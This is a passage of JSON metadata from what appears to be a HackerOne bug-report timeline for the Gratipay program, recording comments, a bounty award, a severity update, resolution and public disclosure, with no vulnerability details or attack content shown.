@valievkarim.","automated_response":false,"created_at":"2016-07-19T15:55:32.452Z","updated_at":"2016-07-19T15:55:32.452Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1076129,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Additional $39 to total $40 for a moderate risk per our [program](https://hackerone.com/gratipay).","automated_response":false,"created_at":"2016-07-19T15:56:23.051Z","updated_at":"2016-07-19T15:56:23.051Z","actor":{"url":"/gratipay","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Gratipay"}},"bounty_amount":"39.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"gratipay","collaborator":{"username":"valievkarim","url":"/valievkarim"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1079470,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you!","automated_response":false,"created_at":"2016-07-21T07:29:50.489Z","updated_at":"2016-07-21T07:29:50.489Z","actor":{"username":"valievkarim","cleared":false,"url":"/valievkarim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1132273,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"[Issue was opened](https://github.com/gratipay/inside.gratipay.com/issues/766) regarding this report.","automated_response":false,"created_at":"2016-08-17T16:49:57.358Z","updated_at":"2016-08-17T16:49:57.358Z","actor":{"username":"nashe_","cleared":false,"url":"/nashe_","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1326584,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2016-11-29T15:55:34.907Z","updated_at":"2016-11-29T15:55:34.907Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":10146},"actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1495789,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Done in https://github.com/gratipay/inside.gratipay.com/pull/788!","automated_response":false,"created_at":"2017-02-20T22:20:06.248Z","updated_at":"2017-02-20T22:20:06.248Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"valievkarim","url":"/valievkarim"},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1495799,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-02-20T22:31:09.618Z","updated_at":"2017-02-20T22:31:09.618Z","first_to_agree":true,"actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1558351,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-03-22T22:31:09.801Z","updated_at":"2017-03-22T22:31:09.801Z","actor":{"url":"/gratipay","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Gratipay"}},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}